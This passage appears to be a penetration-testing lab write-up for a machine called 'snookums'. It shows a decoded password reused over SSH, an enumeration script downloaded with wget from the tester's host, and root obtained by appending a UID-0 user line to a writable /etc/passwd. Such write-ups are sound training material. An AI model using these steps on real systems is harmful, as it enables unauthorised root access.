└─$ echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d
HockSydneyCertify123  
┌──(kali㉿kali)-[~]
└─$ ssh michael@192.168.161.58
The authenticity of host '192.168.161.58 (192.168.161.58)' can't be established.
ECDSA key fingerprint is SHA256:nfkOmeL2QxNkGBT3JRTbauw43J3xmPssmQZswhSgxK0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.161.58' (ECDSA) to the list of known hosts.
michael@192.168.161.58's password: 
Last failed login: Sun Feb 13 08:55:11 EST 2022 on pts/1
There were 2 failed login attempts since the last successful login.
[michael@snookums ~]$ # Password is HockSydneyCertify123
[michael@snookums ~]$ ls
local.txt
[michael@snookums ~]$ cat local.txt
29458ba4c5d6cf75542f8ef6e381ae4f
[michael@snookums ~]$ ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.161.58  netmask 255.255.255.0  broadcast 192.168.161.255
        ether 00:50:56:ba:92:74  txqueuelen 1000  (Ethernet)
        RX packets 166279  bytes 12555396 (11.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23846  bytes 8688774 (8.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 188  bytes 14056 (13.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 188  bytes 14056 (13.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[michael@snookums ~]$ 
```

![](Pasted%20image%2020220213221302.png)
# Privesc2 - /etc/passwd

```
[michael@snookums ~]$ cd /tmp
[michael@snookums tmp]$ ./lse.sh
-bash: ./lse.sh: No such file or directory
[michael@snookums tmp]$ ls
systemd-private-caab6816c3ea4fbf9fd4788f5b5b590a-chronyd.service-vrXX39  systemd-private-caab6816c3ea4fbf9fd4788f5b5b590a-httpd.service-vZgInS
[michael@snookums tmp]$ wget 192.168.49.161/lse.sh && chmod +x lse.sh
--2022-02-13 09:10:36--  http://192.168.49.161/lse.sh
Connecting to 192.168.49.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

100%[==============================================================================================================================>] 43,570       115KB/s   in 0.4s   

2022-02-13 09:10:37 (115 KB/s) - ‘lse.sh’ saved [43570/43570]

[michael@snookums tmp]$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: HockSydneyCertify123                                                                     
---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: michael
     User ID: 1000
    Password: ******
        Home: /home/michael
        Path: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin
       umask: 0002

    Hostname: snookums
       Linux: 3.10.0-1127.10.1.el7.x86_64
Distribution: CentOS Linux 7 (Core)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'michael' have mail?....................................... yes!
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. yes!
---
-rw-r--r--. 1 michael root 1225 Jun 11  2020 /etc/passwd
---
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'michael'................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... yes!                                                                                        
---
GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash
---
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. yes!
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. yes!
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
[michael@snookums tmp]$ su dummyroot
su: user dummyroot does not exist
[michael@snookums tmp]$ echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> /etc/passwd
[michael@snookums tmp]$ su dummyroot
Password: 
[root@snookums tmp]# cd /root
[root@snookums ~]# cat proof.txt
a16f0f4099a6881bf2faa9af69c4a0da
[root@snookums ~]# ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.161.58  netmask 255.255.255.0  broadcast 192.168.161.255
        ether 00:50:56:ba:92:74  txqueuelen 1000  (Ethernet)
        RX packets 166831  bytes 12644817 (12.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24212  bytes 8761372 (8.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 190  bytes 14156 (13.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 190  bytes 14156 (13.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[root@snookums ~]# 

```

![](Pasted%20image%2020220213221530.png)

# Others